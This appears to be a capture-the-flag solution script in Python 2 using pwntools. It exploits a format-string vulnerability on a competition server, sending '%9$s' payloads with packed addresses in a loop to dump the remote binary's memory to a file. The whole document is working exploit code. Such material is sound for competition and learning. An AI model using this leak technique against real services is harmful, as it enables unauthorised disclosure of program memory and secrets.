#!/usr/bin/python

# objdump -Mintel,x86-64 -b binary -m i386 --adjust-vma=0x400601 -D binary

t = 0
ttext = ""
ff = open("binary", "w")
from pwn import *
#r = remote("ctf.sharif.edu", 54517)
for j in range(1, 500):
    r = remote("ctf.sharif.edu", 54514)
    try:
        b = 0x400601
        print "Try #{}: {}".format(j, "{}".format(hex(b+t)))
        r.sendline("%00009$s"+p64(b+t))
        try:
            addr = r.recv(1024)
            print len(addr)
            addr = addr[:-3]
            ttext += (addr + "\x00")
            ff.write(addr + "\x00")
            t += len(addr) + 1
            print "recv", addr, hexdump(addr)
            #addr = int(addr.strip(), 16)
        except Exception as e:
            print "addr", e
            ttext += "\x00"
            ff.write("\x00")
            t += 1
            addr = 0
        r.close()
    except Exception as e:
        t += 1 
        print e
        continue

ff.close()
